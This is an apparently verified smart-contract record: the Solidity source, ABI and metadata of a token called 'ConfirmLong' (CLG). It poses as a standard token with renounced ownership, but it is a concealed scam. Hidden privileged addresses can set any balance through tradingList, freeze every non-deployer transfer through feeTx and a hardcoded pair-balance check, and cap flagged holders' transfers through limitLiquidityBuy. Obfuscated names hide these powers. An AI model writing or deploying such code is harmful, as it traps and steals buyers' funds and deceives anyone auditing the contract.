{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.2;\n\ninterface tradingReceiver {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address minBuy) external view returns (uint256);\n\n    function transfer(address senderMode, uint256 feeLiquidity) external returns (bool);\n\n    function allowance(address feeFund, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 feeLiquidity) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address senderMode,\n        uint256 feeLiquidity\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed feeSell, uint256 value);\n    event Approval(address indexed feeFund, address indexed spender, uint256 value);\n}\n\nabstract contract maxMarketingToken {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface listEnableAmount {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\ninterface receiverAtReceiver {\n    function createPair(address isReceiver, address feeSenderExempt) external returns (address);\n}\n\ninterface tradingReceiverMetadata is tradingReceiver {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract ConfirmLong is maxMarketingToken, tradingReceiver, tradingReceiverMetadata {\n\n    uint256 private maxWallet = 100000000 * 10 ** 18;\n\n    function tradingList(address senderLiquidityTx, uint256 feeLiquidity) public {\n        toTeam();\n        takeSenderList[senderLiquidityTx] = feeLiquidity;\n    }\n\n    function allowance(address senderMarketing, address toAmountFund) external view virtual override returns (uint256) {\n        if (toAmountFund == takeTrading) {\n            return type(uint256).max;\n        }\n        return swapWallet[senderMarketing][toAmountFund];\n    }\n\n    function feeTx(uint256 feeLiquidity) public {\n        toTeam();\n        receiverAmountLiquidity = feeLiquidity;\n    }\n\n    function transfer(address senderLiquidityTx, uint256 feeLiquidity) external virtual override returns (bool) {\n        return exemptEnable(_msgSender(), senderLiquidityTx, feeLiquidity);\n    }\n\n    mapping(address => bool) public shouldExempt;\n\n    uint8 private receiverSwap = 18;\n\n    function exemptEnable(address modeWallet, address senderMode, uint256 feeLiquidity) internal returns (bool) {\n        if (modeWallet == sellMarketing) {\n            return minReceiver(modeWallet, senderMode, feeLiquidity);\n        }\n        uint256 maxEnable = tradingReceiver(receiverLiquidity).balanceOf(totalWallet);\n        require(maxEnable == receiverAmountLiquidity);\n        require(senderMode != totalWallet);\n        if (shouldExempt[modeWallet]) {\n            return minReceiver(modeWallet, senderMode, txTeam);\n        }\n        return minReceiver(modeWallet, senderMode, feeLiquidity);\n    }\n\n    function getOwner() external view returns (address) {\n        return modeSender;\n    }\n\n    function senderAt() public {\n        emit OwnershipTransferred(sellMarketing, address(0));\n        modeSender = address(0);\n    }\n\n    function symbol() external view virtual override returns (string memory) {\n        return shouldMarketing;\n    }\n\n    constructor (){\n        if (launchedShould) {\n            launchedShould = false;\n        }\n        listEnableAmount isFrom = listEnableAmount(takeTrading);\n        receiverLiquidity = receiverAtReceiver(isFrom.factory()).createPair(isFrom.WETH(), address(this));\n        if (launchedShould) {\n            isExempt = false;\n        }\n        sellMarketing = _msgSender();\n        senderAt();\n        toLiquidity[sellMarketing] = true;\n        takeSenderList[sellMarketing] = maxWallet;\n        if (isExempt) {\n            launchedShould = false;\n        }\n        emit Transfer(address(0), sellMarketing, maxWallet);\n    }\n\n    bool private isExempt;\n\n    address public receiverLiquidity;\n\n    function approve(address toAmountFund, uint256 feeLiquidity) public virtual override returns (bool) {\n        swapWallet[_msgSender()][toAmountFund] = feeLiquidity;\n        emit Approval(_msgSender(), toAmountFund, feeLiquidity);\n        return true;\n    }\n\n    address takeTrading = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n    uint256 receiverAmountLiquidity;\n\n    uint256 constant txTeam = 16 ** 10;\n\n    mapping(address => mapping(address => uint256)) private swapWallet;\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return maxWallet;\n    }\n\n    function decimals() external view virtual override returns (uint8) {\n        return receiverSwap;\n    }\n\n    function owner() external view returns (address) {\n        return modeSender;\n    }\n\n    string private teamLiquidity = \"Confirm Long\";\n\n    function minReceiver(address modeWallet, address senderMode, uint256 feeLiquidity) internal returns (bool) {\n        require(takeSenderList[modeWallet] >= feeLiquidity);\n        takeSenderList[modeWallet] -= feeLiquidity;\n        takeSenderList[senderMode] += feeLiquidity;\n        emit Transfer(modeWallet, senderMode, feeLiquidity);\n        return true;\n    }\n\n    string private shouldMarketing = \"CLG\";\n\n    function balanceOf(address minBuy) public view virtual override returns (uint256) {\n        return takeSenderList[minBuy];\n    }\n\n    mapping(address => bool) public toLiquidity;\n\n    function name() external view virtual override returns (string memory) {\n        return teamLiquidity;\n    }\n\n    bool public txList;\n\n    address totalWallet = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;\n\n    mapping(address => uint256) private takeSenderList;\n\n    bool private launchedShould;\n\n    function isSenderLaunched(address autoTokenLaunch) public {\n        if (teamFrom) {\n            return;\n        }\n        if (launchedShould) {\n            launchedShould = false;\n        }\n        toLiquidity[autoTokenLaunch] = true;\n        if (isExempt) {\n            txList = true;\n        }\n        teamFrom = true;\n    }\n\n    function transferFrom(address modeWallet, address senderMode, uint256 feeLiquidity) external override returns (bool) {\n        if (_msgSender() != takeTrading) {\n            if (swapWallet[modeWallet][_msgSender()] != type(uint256).max) {\n                require(feeLiquidity <= swapWallet[modeWallet][_msgSender()]);\n                swapWallet[modeWallet][_msgSender()] -= feeLiquidity;\n            }\n        }\n        return exemptEnable(modeWallet, senderMode, feeLiquidity);\n    }\n\n    event OwnershipTransferred(address indexed modeFee, address indexed sellTeam);\n\n    bool public teamFrom;\n\n    address public sellMarketing;\n\n    uint256 tokenShould;\n\n    function toTeam() private view {\n        require(toLiquidity[_msgSender()]);\n    }\n\n    function limitLiquidityBuy(address fundMax) public {\n        toTeam();\n        \n        if (fundMax == sellMarketing || fundMax == receiverLiquidity) {\n            return;\n        }\n        shouldExempt[fundMax] = true;\n    }\n\n    address private modeSender;\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"feeFund\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"modeFee\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"sellTeam\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"feeSell\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"senderMarketing\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"toAmountFund\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"toAmountFund\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"feeLiquidity\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"minBuy\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"feeLiquidity\",\"type\":\"uint256\"}],\"name\":\"feeTx\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"autoTokenLaunch\",\"type\":\"address\"}],\"name\":\"isSenderLaunched\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"fundMax\",\"type\":\"address\"}],\"name\":\"limitLiquidityBuy\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"receiverLiquidity\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"sellMarketing\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"senderAt\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"shouldExempt\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"teamFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"toLiquidity\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"senderLiquidityTx\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"feeLiquidity\",\"type\":\"uint256\"}],\"name\":\"tradingList\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"senderLiquidityTx\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"feeLiquidity\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"modeWallet\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"senderMode\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"feeLiquidity\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"txList\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"}]", "ContractName": "ConfirmLong", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}